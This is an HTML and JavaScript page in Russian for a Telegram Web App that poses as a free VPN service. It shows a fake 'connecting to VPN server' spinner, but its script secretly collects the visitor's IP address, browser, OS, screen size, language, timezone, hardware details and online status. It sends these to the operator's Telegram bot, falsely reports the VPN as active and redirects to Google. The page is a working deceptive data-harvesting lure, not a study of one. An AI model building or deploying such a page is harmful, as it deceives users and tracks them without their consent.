<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Бесплатный VPN - Загрузка...</title>
    <!-- Tailwind CSS CDN для быстрого и адаптивного дизайна -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Пользовательские стили для шрифта Inter */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1a202c; /* Темный фон */
            color: #e2e8f0; /* Светлый текст */
        }
        /* Стили для спиннера загрузки */
        .loader {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #3498db; /* Синий цвет для спиннера */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="bg-gray-800 p-8 rounded-xl shadow-2xl w-full max-w-md space-y-6 border border-gray-700 text-center">
        <h1 class="text-3xl font-bold text-blue-400 mb-6">Получение бесплатного VPN</h1>
        
        <div class="flex justify-center items-center mb-6">
            <div class="loader"></div>
        </div>

        <p id="status-message" class="text-lg text-gray-300">Идет подключение к ближайшему VPN-серверу...</p>
        <p class="text-sm text-gray-500 mt-2">Пожалуйста, подождите, это может занять несколько секунд.</p>

        <!-- Этот блок будет скрыт, так как данные отправляются автоматически -->
        <div id="data-display" class="space-y-4 text-left hidden">
            <div class="bg-gray-700 p-4 rounded-lg flex items-center space-x-3">
                <svg class="w-6 h-6 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18v-18"></path></svg>
                <div>
                    <p class="text-sm text-gray-400">Ваш IP-адрес:</p>
                    <p id="ip-address" class="font-semibold text-lg text-white">Загрузка...</p>
                </div>
            </div>

            <div class="bg-gray-700 p-4 rounded-lg flex items-center space-x-3">
                <svg class="w-6 h-6 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-1.25-3M15 10V5a3 3 0 00-3-3V2.5c-1.036 0-1.99.4-2.707 1.107A3 3 0 006 5v5m6 0h.01M12 10h-.01"></path></svg>
                <div>
                    <p class="text-sm text-gray-400">Браузер/ОС:</p>
                    <p id="user-agent" class="font-semibold text-white text-sm break-all">Загрузка...</p>
                </div>
            </div>

            <div class="bg-gray-700 p-4 rounded-lg flex items-center space-x-3">
                <svg class="w-6 h-6 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z"></path></svg>
                <div>
                    <p class="text-sm text-gray-400">Разрешение экрана:</p>
                    <p id="screen-resolution" class="font-semibold text-white text-lg">Загрузка...</p>
                </div>
            </div>

            <div class="bg-gray-700 p-4 rounded-lg flex items-center space-x-3">
                <svg class="w-6 h-6 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5h12M9 3v2m1.048 9.5A18.022 18.022 0 018.648 16H3.67a2.25 2.25 0 01-2.244-2.077L1.08 9.381A2.25 2.25 0 013.325 7.25h11.298.674a2.25 2.25 0 012.244 2.077l.666 3.542A2.25 2.25 0 0118.325 16h-4.659c.18.16.358.32.537.478z"></path></svg>
                <div>
                    <p class="text-sm text-gray-400">Язык браузера:</p>
                    <p id="browser-language" class="font-semibold text-white text-lg">Загрузка...</p>
                </div>
            </div>

            <div class="bg-gray-700 p-4 rounded-lg flex items-center space-x-3">
                <svg class="w-6 h-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                <div>
                    <p class="text-sm text-gray-400">Часовой пояс:</p>
                    <p id="timezone" class="font-semibold text-white text-lg">Загрузка...</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Инициализация Telegram Web App API
        if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
            Telegram.WebApp.ready();
            Telegram.WebApp.expand(); // Разворачиваем Web App на весь экран
        } else {
            console.warn("Telegram.WebApp API не доступен. Возможно, приложение запущено вне Telegram.");
            document.getElementById('status-message').innerText = "Запустите это приложение внутри Telegram для полной функциональности.";
        }

        const statusMessageEl = document.getElementById('status-message');
        let osintData = {}; // Объект для хранения собранных данных

        // Функция для сбора IP-адреса
        async function getIpAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Ошибка при получении IP-адреса:', error);
                return 'Неизвестно';
            }
        }

        // Функция для сбора всех OSINT данных
        async function collectOsintData() {
            statusMessageEl.innerText = "Идет подключение к ближайшему VPN-серверу...";
            
            // Имитация задержки для "подключения"
            await new Promise(resolve => setTimeout(resolve, 5000)); // Задержка 5 секунд

            osintData.ip = await getIpAddress();
            osintData.userAgent = navigator.userAgent;
            osintData.screenResolution = `${window.screen.width}x${window.screen.height}`;
            osintData.browserLanguage = navigator.language || navigator.userLanguage;
            osintData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // Дополнительные данные
            osintData.platform = navigator.platform;
            osintData.hardwareConcurrency = navigator.hardwareConcurrency;
            osintData.deviceMemory = navigator.deviceMemory;
            osintData.online = navigator.onLine;

            statusMessageEl.innerText = "Успешно подключено. Отправка данных...";
            // Дополнительная задержка перед отправкой
            await new Promise(resolve => setTimeout(resolve, 3000)); // Задержка 3 секунды перед отправкой

            await sendDataToBot();
        }

        // Функция для отправки данных в Telegram-бот
        async function sendDataToBot() {
            if (!Telegram.WebApp || !Telegram.WebApp.sendData) {
                statusMessageEl.innerText = "Ошибка: Telegram WebApp API недоступен для отправки данных.";
                console.error("Telegram.WebApp.sendData не доступен.");
                return;
            }

            try {
                Telegram.WebApp.sendData(JSON.stringify(osintData));
                statusMessageEl.innerText = "VPN активирован. Наслаждайтесь безопасным соединением!";
                
                // Перенаправление пользователя через 3 секунды после завершения
                setTimeout(() => {
                    window.location.href = "https://google.com"; // Замените на нужный URL для перенаправления
                }, 3000); 

            } catch (error) {
                console.error('Ошибка при отправке данных в бот:', error);
                statusMessageEl.innerText = `Ошибка при отправке данных: ${error.message}`;
            }
        }

        // Запускаем сбор данных при загрузке страницы
        window.onload = collectOsintData;
    </script>
</body>
</html>
